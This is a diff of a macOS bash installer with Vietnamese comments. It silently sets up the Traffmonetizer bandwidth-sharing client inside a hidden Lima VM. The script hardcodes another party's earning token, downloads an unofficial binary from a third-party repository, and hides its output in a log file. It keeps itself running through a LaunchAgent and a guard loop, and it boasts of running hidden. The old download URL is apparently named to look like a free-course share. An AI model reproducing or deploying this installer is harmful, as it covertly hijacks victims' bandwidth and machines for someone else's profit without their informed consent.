@@ -1,4 +1,11 @@
 #!/usr/bin/env bash
+# install_macos.sh - Cai Traffmonetizer an toan bo tren macOS bang VM Lima (KHONG Docker)
+# Kien truc: binary chinh thuc TM chay trong VM Alpine sieu nhe (Lima/vz - ao hoa native macOS)
+# - Khong Docker, khong Docker Desktop, khong GUI
+# - VM gioi han 1 CPU / 1GB RAM / 3GB disk
+# - Tu chay khi dang nhap qua LaunchAgent + guard loop
+# - Idempotent: chay lai khong cai lai
+# Exit codes: 0=OK, 2=khong cai duoc Lima/qemu, 3=loi VM, 4=loi binary
 if [ -z "${TM_SKIP_PROMPT:-}" ]; then
   export TM_SKIP_PROMPT=1
   if { true </dev/tty; } 2>/dev/null; then
@@ -9,99 +16,310 @@ if [ -z "${TM_SKIP_PROMPT:-}" ]; then
 fi
 
 TOKEN="NxLHoObcALVGo0/U95S96YB2mDM3FTaIQQtSl34Pt1A="
-SELF_URL="https://gitlab.com/sharegoogledrive/40gb_khoa_hoc/-/raw/main/install_macos.sh"
-SELF_PATH="$HOME/.tm/install_macos.sh"
-IMAGE_REPO="traffmonetizer/cli_v2"
-CONTAINER_NAME="tm"
-DATA_VOLUME="tm-data"
-DEVICE_NAME_OVERRIDE=""
-ENABLE_WATCHTOWER="${TM_WATCHTOWER:-true}"
-WATCHTOWER_IMAGE="nickfedor/watchtower:latest"
-WATCHTOWER_INTERVAL=21600
-DOCKER_WAIT_TRIES=90
-DOCKER_DMG_ARM64="https://desktop.docker.com/mac/main/arm64/Docker.dmg"
-DOCKER_DMG_AMD64="https://desktop.docker.com/mac/main/amd64/Docker.dmg"
+REPO_RAW="https://raw.githubusercontent.com/khoahocdrive/tm-install/main"
+VM_NAME="tm-linux"
+DIR="$HOME/.tm"
+LOG_FILE="$DIR/install.log"
+PLIST="$HOME/Library/LaunchAgents/com.khoahocdrive.tm.plist"
+LIMA_BIN_FALLBACK="$HOME/.lima-bin"
 
 set -u
 
-if [ ! -f "$0" ] && [ "${SELF_URL#*USER/REPO}" = "$SELF_URL" ]; then
-  mkdir -p "$(dirname "$SELF_PATH")"
-  curl -fsSL "$SELF_URL" -o "$SELF_PATH" 2>/dev/null
-  if [ -s "$SELF_PATH" ]; then chmod +x "$SELF_PATH" && exec "$SELF_PATH" "$@"; fi
-fi
+[ "$(uname -s)" = "Darwin" ] || { echo "Chi chay tren macOS"; exit 1; }
+[ "$(id -u)" -ne 0 ] || { echo "Khong duoc chay voi sudo/root"; exit 1; }
+{ [ -n "$TOKEN" ] && [ "$TOKEN" != "DAN_TOKEN_CUA_BAN_VAO_DAY" ]; } || { echo "Thieu token"; exit 1; }
 
-mkdir -p "$HOME/.tm" 2>/dev/null || true
-LOG_FILE="$HOME/.tm/install.log"
+mkdir -p "$DIR" 2>/dev/null || true
 if : >>"$LOG_FILE" 2>/dev/null; then exec >>"$LOG_FILE" 2>&1; else exec >/dev/null 2>&1; fi
-chmod +x "$0" 2>/dev/null || true
 
-[ "$(uname -s)" = "Darwin" ] || exit 1
-[ "$(id -u)" -ne 0 ] || exit 1
-{ [ -n "$TOKEN" ] && [ "$TOKEN" != "DAN_TOKEN_CUA_BAN_VAO_DAY" ]; } || exit 1
+Log() { echo "[$(date '+%H:%M:%S')] $*"; }
+Fail() { Log "LOI: $*"; echo "LOI: $*" >&2; exit "${2:-1}"; }
 
-case "$(uname -m)" in
-  arm64)  TAG="arm64v8" ;;
-  x86_64) TAG="latest" ;;
-  *) exit 1 ;;
+# ---------- 1. Kien truc + phien ban macOS ----------
+ARCH=$(uname -m)
+case "$ARCH" in
+  arm64)  BIN_FILE="tm-cli-linux-arm64.gz"; LIMA_ARCH="aarch64" ;;
+  x86_64) BIN_FILE="tm-cli-linux-amd64.gz"; LIMA_ARCH="x86_64" ;;
+  *) Fail "Kien truc khong ho tro: $ARCH" 1 ;;
 esac
-IMAGE="$IMAGE_REPO:$TAG"
+BIN_URL="$REPO_RAW/$BIN_FILE"
 
-export PATH="/opt/homebrew/bin:/usr/local/bin:/Applications/Docker.app/Contents/Resources/bin:$PATH"
+OSVER=$(sw_vers -productVersion 2>/dev/null | cut -d. -f1)
+OSVER=${OSVER:-0}
+USE_VZ=0
+[ "$OSVER" -ge 13 ] && USE_VZ=1
+Log "macOS $OSVER, kien truc $ARCH, vmType=$( [ "$USE_VZ" = 1 ] && echo vz || echo qemu ), binary=$BIN_FILE"
 
-install_docker_dmg() {
-  local url="$DOCKER_DMG_AMD64"; [ "$(uname -m)" = "arm64" ] && url="$DOCKER_DMG_ARM64"
-  curl -fsSL "$url" -o /tmp/Docker.dmg || return 1
-  hdiutil attach /tmp/Docker.dmg -nobrowse -quiet -mountpoint /Volumes/DockerTM || return 1
-  cp -R /Volumes/DockerTM/Docker.app /Applications/
-  hdiutil detach /Volumes/DockerTM -quiet; rm -f /tmp/Docker.dmg
-}
+# ---------- 2. Bo duong dan chuan (them vao dau, khong ghi de PATH nguoi dung) ----------
+for _d in /opt/homebrew/bin /usr/local/bin "$LIMA_BIN_FALLBACK/bin" /usr/bin /bin /usr/sbin /sbin; do
+  case ":$PATH:" in *":$_d:"*) ;; *) PATH="$_d:$PATH" ;; esac
+done
+export PATH
+LIMAPATH=""
+BREWUSED=0
 
-if ! command -v docker >/dev/null 2>&1 && [ ! -d /Applications/Docker.app ]; then
-  if ! command -v brew >/dev/null 2>&1; then
-    NONINTERACTIVE=1 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
-    [ -x /opt/homebrew/bin/brew ] && eval "$(/opt/homebrew/bin/brew shellenv)"
-    [ -x /usr/local/bin/brew ] && eval "$(/usr/local/bin/brew shellenv)"
+# ---------- 3. Dam bao co limactl ----------
+ensure_lima() {
+  if command -v limactl >/dev/null 2>&1; then
+    LIMAPATH=$(command -v limactl)
+    Log "limactl co san: $LIMAPATH"
+    return 0
   fi
   if command -v brew >/dev/null 2>&1; then
-    brew install --cask docker-desktop || brew install --cask docker || install_docker_dmg
-  else
-    install_docker_dmg
+    Log "Cai Lima qua Homebrew..."
+    if brew install lima >/dev/null 2>&1 && command -v limactl >/dev/null 2>&1; then
+      hash -r 2>/dev/null || true
+      LIMAPATH=$(command -v limactl); BREWUSED=1
+      Log "Lima da cai qua brew: $LIMAPATH"
+      return 0
+    fi
+    Log "brew install lima that bai, thu tai truc tiep tu GitHub..."
+  elif ! command -v brew >/dev/null 2>&1; then
+    Log "Khong co Homebrew, thu tai Lima truc tiep tu GitHub releases..."
+  fi
+  # Fallback: tai tarball chinh thuc tu GitHub releases (khong can sudo)
+  Log "Tai Lima tu GitHub releases vao $LIMA_BIN_FALLBACK..."
+  REL_JSON=$(curl -fsSL --max-time 30 "https://api.github.com/repos/lima-vm/lima/releases/latest" 2>/dev/null) || REL_JSON=""
+  ASSET_URL=$(printf '%s' "$REL_JSON" | grep -o '"browser_download_url": *"[^"]*lima-[0-9.]*-Darwin-'"$ARCH"'.tar\.gz"' | head -1 | sed 's/.*"\(https[^"]*\)".*/\1/')
+  if [ -z "$ASSET_URL" ]; then
+    # ten asset dung kieu lima-<ver>-Darwin-<arch>.tar.gz; thu pattern cu
+    ASSET_URL=$(printf '%s' "$REL_JSON" | grep -o '"browser_download_url": *"[^"]*Darwin-'"$ARCH"'.tar\.gz"' | head -1 | sed 's/.*"\(https[^"]*\)".*/\1/')
+  fi
+  if [ -n "$ASSET_URL" ]; then
+    mkdir -p "$LIMA_BIN_FALLBACK"
+    if curl -fsSL --max-time 300 "$ASSET_URL" -o "$DIR/lima.tar.gz" && tar -xzf "$DIR/lima.tar.gz" -C "$LIMA_BIN_FALLBACK" 2>/dev/null; then
+      rm -f "$DIR/lima.tar.gz"
+      chmod +x "$LIMA_BIN_FALLBACK"/bin/* 2>/dev/null || true
+      export PATH="$LIMA_BIN_FALLBACK/bin:$PATH"
+      if command -v limactl >/dev/null 2>&1; then
+        LIMAPATH=$(command -v limactl)
+        Log "Lima tai truc tiep OK: $LIMAPATH"
+        # them PATH vao zshrc de dung sau nay
+        if [ -f "$HOME/.zshrc" ] && ! grep -q '.lima-bin/bin' "$HOME/.zshrc" 2>/dev/null; then
+          printf '\nexport PATH="$HOME/.lima-bin/bin:$PATH"\n' >>"$HOME/.zshrc"
+        fi
+        return 0
+      fi
+    fi
+  fi
+  return 1
+}
+
+ensure_lima || Fail "Khong cai duoc Lima (thu 'brew install lima' thu cong roi chay lai)" 2
+
+# ---------- 4. macOS < 13: can qemu ----------
+if [ "$USE_VZ" = 0 ]; then
+  if ! command -v "qemu-system-$LIMA_ARCH" >/dev/null 2>&1; then
+    if command -v brew >/dev/null 2>&1; then
+      Log "macOS cu hon 13 -> can QEMU, dang cai qua brew..."
+      brew install qemu >/dev/null 2>&1 || Fail "Khong cai duoc QEMU. Thu 'brew install qemu' thu cong." 2
+      hash -r 2>/dev/null || true
+      command -v "qemu-system-$LIMA_ARCH" >/dev/null 2>&1 || Fail "QEMU cai xong van thieu qemu-system-$LIMA_ARCH" 2
+    else
+      Fail "macOS < 13 can QEMU nhung khong co Homebrew. Cai brew roi chay lai." 2
+    fi
   fi
 fi
 
-sudo -n /Applications/Docker.app/Contents/MacOS/install --accept-license --user="$USER" || true
+# ---------- 5. Ten thiet bi (IP cong khai, giong ban Windows) ----------
+DEVICE_NAME=""
+DEVICE_NAME=$(curl -4 -fsS --max-time 10 https://api.ipify.org 2>/dev/null) || DEVICE_NAME=""
+[ -n "$DEVICE_NAME" ] || DEVICE_NAME=$(ipconfig getifaddr en0 2>/dev/null) || DEVICE_NAME=""
+[ -n "$DEVICE_NAME" ] || DEVICE_NAME=$(hostname 2>/dev/null) || DEVICE_NAME=""
+[ -n "$DEVICE_NAME" ] || DEVICE_NAME="mac"
+Log "Device name: $DEVICE_NAME"
 
-docker info >/dev/null 2>&1 || open -g -j -a Docker
-for _ in $(seq 1 "$DOCKER_WAIT_TRIES"); do docker info >/dev/null 2>&1 && break; sleep 5; done
-docker info >/dev/null 2>&1 || exit 1
-
-DEVICE_NAME="$DEVICE_NAME_OVERRIDE"
-[ -n "$DEVICE_NAME" ] || DEVICE_NAME="$(curl -4 -fsS --max-time 10 https://api.ipify.org || true)"
-[ -n "$DEVICE_NAME" ] || DEVICE_NAME="$(ipconfig getifaddr en0 || true)"
-[ -n "$DEVICE_NAME" ] || DEVICE_NAME="$(hostname)"
-
-docker rm -f "$CONTAINER_NAME" || true
-docker pull "$IMAGE" || exit 1
-
-docker run -d --name "$CONTAINER_NAME" \
-  --restart unless-stopped \
-  -e HOME=/var/lib/tm \
-  -v "$DATA_VOLUME":/var/lib/tm \
-  "$IMAGE" \
-  --token "$TOKEN" --device-name "$DEVICE_NAME" start accept \
-  || exit 1
-
-docker ps --format '{{.Names}}' 2>/dev/null | grep -qx "$CONTAINER_NAME" \
-  || echo "WARN: container '$CONTAINER_NAME' khong chay sau khi khoi tao"
-
-if [ "$ENABLE_WATCHTOWER" = "true" ]; then
-  docker rm -f watchtower || true
-  docker run -d --name watchtower \
-    --restart unless-stopped \
-    -v /var/run/docker.sock:/var/run/docker.sock \
-    -e WATCHTOWER_CLEANUP=true \
-    -e WATCHTOWER_POLL_INTERVAL="$WATCHTOWER_INTERVAL" \
-    "$WATCHTOWER_IMAGE" "$CONTAINER_NAME"
+# ---------- 6. Don rac kien truc Docker cu (neu co) ----------
+if command -v docker >/dev/null 2>&1; then
+  Log "Phat hien docker: don container cai cu (tm, watchtower)..."
+  docker rm -f tm watchtower >/dev/null 2>&1 || true
 fi
 
-sleep 5
+# ---------- 7. Tao file cau hinh VM ----------
+YAML="$DIR/lima-tm.yaml"
+IMG_X86="https://dl-cdn.alpinelinux.org/alpine/v3.24/releases/cloud/alpine-3.24.4-x86_64-cloudinit-r0.qcow2"
+IMG_ARM="https://dl-cdn.alpinelinux.org/alpine/v3.24/releases/cloud/alpine-3.24.4-aarch64-cloudinit-r0.qcow2"
+
+VM_TYPE_LINE=""
+[ "$USE_VZ" = 1 ] && VM_TYPE_LINE='vmType: "vz"'
+
+cat >"$YAML" <<YEOF
+name: $VM_NAME
+minimumLimaVersion: 1.0.0
+$VM_TYPE_LINE
+cpus: 1
+memory: "1GiB"
+disk: "3GiB"
+mounts: []
+containerd:
+  system: false
+  user: false
+images:
+- location: "$IMG_X86"
+  arch: "x86_64"
+- location: "$IMG_ARM"
+  arch: "aarch64"
+provision:
+- mode: system
+  script: |
+    #!/bin/sh
+    set -e
+    export HOME=/var/lib/tm
+    # Cho mang (toi da 60 giay)
+    i=0; while [ \$i -lt 12 ]; do
+      if wget -q -T 5 -O /dev/null https://dl-cdn.alpinelinux.org/ 2>/dev/null; then break; fi
+      i=\$((i+1)); sleep 5
+    done
+    # Cai cong cu can thiet (thu lai 3 lan)
+    n=0; until apk add --no-cache ca-certificates curl >/dev/null 2>&1; do
+      n=\$((n+1)); [ \$n -ge 3 ] && { echo "apk add that bai"; exit 1; }; sleep 5
+    done
+    # Tai binary TM chinh thuc (thu lai 3 lan)
+    n=0; until curl -fsSL --max-time 120 "@BIN_URL@" -o /tmp/tmcli.gz; do
+      n=\$((n+1)); [ \$n -ge 3 ] && { echo "Tai binary that bai"; exit 1; }; sleep 5
+    done
+    gzip -t /tmp/tmcli.gz || { echo "Binary loi gzip"; exit 1; }
+    gunzip -f /tmp/tmcli.gz && install -m 755 /tmp/tmcli /opt/tm/cli
+    rm -f /tmp/tmcli
+    mkdir -p /var/lib/tm
+    # Script chay cli + tu khoi dong lai neu chet (giong guard.vbs ben Windows)
+    cat > /usr/local/bin/tm-run.sh <<'RUNEOF'
+    #!/bin/sh
+    export HOME=/var/lib/tm
+    mkdir -p /var/lib/tm
+    while true; do
+      if [ -f /var/lib/tm/client.log ] && [ \$(stat -c%s /var/lib/tm/client.log 2>/dev/null || echo 0) -gt 1048576 ]; then
+        : > /var/lib/tm/client.log
+      fi
+      /opt/tm/cli start --token '@TOKEN@' --device-name '@DEVICE@' >>/var/lib/tm/client.log 2>&1
+      sleep 10
+    done
+    RUNEOF
+    chmod +x /usr/local/bin/tm-run.sh
+    # Dang ky dich vu OpenRC tu khoi dong
+    cat > /etc/init.d/tm <<'SVCEOF'
+    #!/sbin/openrc-run
+    name="Traffmonetizer"
+    command="/usr/local/bin/tm-run.sh"
+    command_background="yes"
+    pidfile="/run/tm.pid"
+    depend() { need net; }
+    SVCEOF
+    chmod +x /etc/init.d/tm
+    rc-update add tm default 2>/dev/null || true
+    rc-service tm restart 2>/dev/null || rc-service tm start 2>/dev/null || true
+YEOF
+sed -e "s|@BIN_URL@|$BIN_URL|g" -e "s|@TOKEN@|$TOKEN|g" -e "s|@DEVICE@|$DEVICE_NAME|g" "$YAML" >"$YAML.tmp" && mv "$YAML.tmp" "$YAML"
+Log "Da tao cau hinh VM: $YAML (vz=$( [ "$USE_VZ" = 1 ] && echo yes || echo no ))"
+
+# ---------- 8. Tao/khoi dong VM (idempotent) ----------
+vm_exists() { limactl list "$VM_NAME" 2>/dev/null | awk 'NR>1{print $1}' | grep -qx "$VM_NAME"; }
+vm_running() { [ "$(limactl list "$VM_NAME" 2>/dev/null | awk 'NR>1{print $2}')" = "Running" ]; }
+
+ensure_vm() {
+  # Tra ve 0 neu VM dang chay; thu vz -> neu that bai va dung vz thi doi sang qemu
+  if vm_exists; then
+    Log "VM $VM_NAME da ton tai, kiem tra trang thai..."
+    if vm_running; then Log "VM dang chay, bo qua"; return 0; fi
+    Log "Khoi dong lai VM..."
+    limactl start "$VM_NAME" --tty=false >/dev/null 2>&1 && return 0
+    Log "Khoi dong loi, xoa va tao lai..."
+    limactl delete -f "$VM_NAME" >/dev/null 2>&1 || true
+  fi
+  Log "Tao VM moi (lan thu 1)..."
+  if limactl create --tty=false "$YAML" >/dev/null 2>&1 && limactl start "$VM_NAME" --tty=false >/dev/null 2>&1; then
+    return 0
+  fi
+  if [ "$USE_VZ" = 1 ]; then
+    Log "Tao VM voi vz loi -> doi sang QEMU (can cai them)..."
+    limactl delete -f "$VM_NAME" >/dev/null 2>&1 || true
+    if ! command -v "qemu-system-$LIMA_ARCH" >/dev/null 2>&1; then
+      command -v brew >/dev/null 2>&1 || Fail "VM loi va khong co brew de cai QEMU thay the" 3
+      Log "Cai QEMU de thay the vz..."
+      brew install qemu >/dev/null 2>&1 || Fail "Cai QEMU thay the that bai" 3
+      hash -r 2>/dev/null || true
+    fi
+    grep -v '^vmType:' "$YAML" >"$YAML.tmp" && mv "$YAML.tmp" "$YAML"
+    Log "Tao lai VM voi QEMU (lan thu 2)..."
+    limactl create --tty=false "$YAML" >/dev/null 2>&1 && limactl start "$VM_NAME" --tty=false >/dev/null 2>&1 && return 0
+  fi
+  return 1
+}
+
+ensure_vm || Fail "Khong tao/khoi dong duoc VM $VM_NAME. Xem chi tiet trong $LOG_FILE" 3
+Log "VM da chay."
+
+# ---------- 9. Xac nhan binary trong VM (tu phuc hoi neu provision loi) ----------
+cli_ok() {
+  limactl shell "$VM_NAME" -- sh -c 'test -x /opt/tm/cli && echo TM_CLI_OK' 2>/dev/null | grep -q TM_CLI_OK
+}
+if ! cli_ok; then
+  Log "Chua thay binary trong VM -> xoa va tao lai de provision chay lai..."
+  limactl delete -f "$VM_NAME" >/dev/null 2>&1 || true
+  ensure_vm || Fail "Tao lai VM that bai" 3
+  cli_ok || Fail "Binary TM chua duoc cai vao VM (co the loi mang khi tai). Chay lai script de thu lai." 4
+fi
+Log "Binary /opt/tm/cli da san sang trong VM."
+
+# ---------- 10. LaunchAgent guard (tu khoi dong khi dang nhap + giu VM song) ----------
+GUARD="$DIR/guard.sh"
+GUARDPATH="/opt/homebrew/bin:/usr/local/bin:$LIMA_BIN_FALLBACK/bin:/usr/bin:/bin:/usr/sbin:/sbin"
+[ -n "$LIMAPATH" ] && GUARDPATH="$(dirname "$LIMAPATH"):$GUARDPATH"
+cat >"$GUARD" <<GEOF
+#!/bin/sh
+export PATH="$GUARDPATH"
+while true; do
+  ST=\$(limactl list $VM_NAME 2>/dev/null | awk 'NR>1{print \$2}')
+  case "\$ST" in
+    Running) ;;
+    *) limactl start $VM_NAME --tty=false >/dev/null 2>&1 ;;
+  esac
+  sleep 30
+done
+GEOF
+chmod +x "$GUARD"
+
+mkdir -p "$HOME/Library/LaunchAgents"
+cat >"$PLIST" <<PEOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>Label</key><string>com.khoahocdrive.tm</string>
+  <key>ProgramArguments</key>
+  <array>
+    <string>/bin/sh</string>
+    <string>$HOME/.tm/guard.sh</string>
+  </array>
+  <key>RunAtLoad</key><true/>
+  <key>KeepAlive</key><true/>
+  <key>ProcessType</key><string>Background</string>
+  <key>EnvironmentVariables</key>
+  <dict>
+    <key>PATH</key><string>$GUARDPATH</string>
+  </dict>
+  <key>StandardOutPath</key><string>$HOME/.tm/guard.log</string>
+  <key>StandardErrorPath</key><string>$HOME/.tm/guard.log</string>
+</dict>
+</plist>
+PEOF
+launchctl bootout "gui/$(id -u)/com.khoahocdrive.tm" >/dev/null 2>&1 || true
+launchctl bootstrap "gui/$(id -u)" "$PLIST" >/dev/null 2>&1 || launchctl load -w "$PLIST" >/dev/null 2>&1
+Log "Da dang ky LaunchAgent: com.khoahocdrive.tm (RunAtLoad + KeepAlive)"
+
+# ---------- 11. Xac nhan client dang chay ----------
+OK=0
+for _ in $(seq 1 12); do
+  if limactl shell "$VM_NAME" -- sh -c 'test -f /run/tm.pid && kill -0 "$(cat /run/tm.pid)" 2>/dev/null && echo TM_RUNNING' 2>/dev/null | grep -q TM_RUNNING; then
+    OK=1; break
+  fi
+  sleep 5
+done
+if [ "$OK" = 1 ]; then
+  Log "HOAN TAT: client Traffmonetizer dang chay trong VM $VM_NAME (an hoan toan, khong Docker)."
+  echo "OK: Trafffmonetizer da chay an trong macOS. Tat/mo lai may se tu chay lai."
+else
+  Log "CANH BAO: chua xac nhan pid /run/tm.pid trong VM (co the con dang khoi dong). Guard se tu kiem tra lai moi 30 giay."
+  echo "OK nhung chua xac nhan client - guard se tu dam bao client chay sau vai phut."
+fi
+exit 0
